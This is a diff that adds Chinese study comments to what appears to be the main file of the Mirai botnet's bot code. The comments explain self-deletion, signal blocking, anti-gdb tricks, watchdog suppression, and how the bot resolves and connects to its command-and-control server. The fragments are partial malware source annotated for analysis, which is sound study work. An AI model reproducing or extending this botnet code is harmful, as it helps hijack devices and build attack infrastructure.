@@ -24,6 +24,8 @@
 #include "util.h"
 #include "resolv.h"
 
+//bot目录下的代码才是“在受感染设备上运行的恶意payload”
+
 static void anti_gdb_entry(int);
 static void resolve_cnc_addr(void);
 static void establish_connection(void);
@@ -31,7 +33,7 @@ static void teardown_connection(void);
 static void ensure_single_instance(void);
 static BOOL unlock_tbl_if_nodebug(char *);
 
-struct sockaddr_in srv_addr;
+struct sockaddr_in srv_addr;    //远程控制C&C服务器的socket信息
 int fd_ctrl = -1, fd_serv = -1;
 BOOL pending_connection = FALSE;
 void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in anti_gdb_entry
@@ -58,14 +60,14 @@ int main(int argc, char **args)
     int wfd;
 
     // Delete self
-    unlink(args[0]);
+    unlink(args[0]);    //一进入main函数，立即删除自身
 
-    // Signal based control flow
+    // Signal based control flow【基于信号的控制流变化】
     sigemptyset(&sigs);
     sigaddset(&sigs, SIGINT);
-    sigprocmask(SIG_BLOCK, &sigs, NULL);
-    signal(SIGCHLD, SIG_IGN);
-    signal(SIGTRAP, &anti_gdb_entry);
+    sigprocmask(SIG_BLOCK, &sigs, NULL);    //屏蔽SIG_BLOCK信号
+    signal(SIGCHLD, SIG_IGN);       //忽略子进程的信号
+    signal(SIGTRAP, &anti_gdb_entry);   //反gdb调试
 
     // Prevent watchdog from rebooting device
     if ((wfd = open("/dev/watchdog", 2)) != -1 ||
@@ -359,8 +361,8 @@ static void resolve_cnc_addr(void)
 {
     struct resolv_entries *entries;
 
-    table_unlock_val(TABLE_CNC_DOMAIN);
-    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
+    table_unlock_val(TABLE_CNC_DOMAIN); //CNC为控制服务器。解码CNC_DOMAIN即控制服务器的域名：report.changeme.com
+    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));    //解析CNC服务器域名的IP【构造DNS请求】
     table_lock_val(TABLE_CNC_DOMAIN);
     if (entries == NULL)
     {
@@ -369,7 +371,7 @@ static void resolve_cnc_addr(void)
 #endif
         return;
     }
-    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
+    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];    //随机选中一个解析的ip存储到srv_addr.sin_addr.s_addr中
     resolv_entries_free(entries);
 
     table_unlock_val(TABLE_CNC_PORT);
